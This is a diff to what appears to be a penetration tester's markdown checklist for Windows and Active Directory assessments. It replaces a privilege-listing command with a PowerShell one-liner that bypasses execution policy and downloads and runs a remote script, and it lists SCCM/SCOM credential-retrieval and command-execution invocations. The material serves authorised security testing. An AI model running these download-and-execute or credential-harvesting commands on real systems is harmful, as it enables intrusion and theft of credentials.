@@ -30,9 +30,9 @@ Example:
 For most assessments it makes sense to follow up enumeration on a provided device. This includes, but is not limited to:
 
 - [ ] Pingcastle
-- [ ] Privs + create Folder
+- [ ] fkad.ps1
 ```ps
-New-Item -ItemType Directory -Path "$env:USERPROFILE\Downloads\fkad" -Force; whoami /priv | Out-File "$env:USERPROFILE\Downloads\fkad\privs.txt"
+powershell -ep bypass -c "IEX (iwr 'https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.ps1')"
 ```
 - [ ] fkmde - Microsoft Defender
 ```ps
@@ -82,6 +82,7 @@ SharpSCCM.exe exec -rid  -p "C:\Windows\System32\cmd.exe"
 SharpSCOM.exe get-server
 SharpSCOM.exe get-creds
 ```
+- [ ] Watson
 
 ## Other Tools
 
